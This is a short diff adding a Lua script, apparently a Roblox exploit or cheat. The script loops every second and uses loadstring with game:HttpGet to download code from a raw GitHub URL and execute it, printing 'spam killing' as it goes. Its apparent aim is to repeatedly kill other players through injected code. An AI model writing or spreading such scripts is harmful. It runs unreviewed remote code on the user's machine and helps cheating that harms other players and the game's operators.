@@ -1,0 +1,7 @@
+_G.kills = true
+while wait(1) do
+if _G.kills == true then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TheVaultBoyz/f1/main/s3'))()
+print("spam killing")
+end
+end
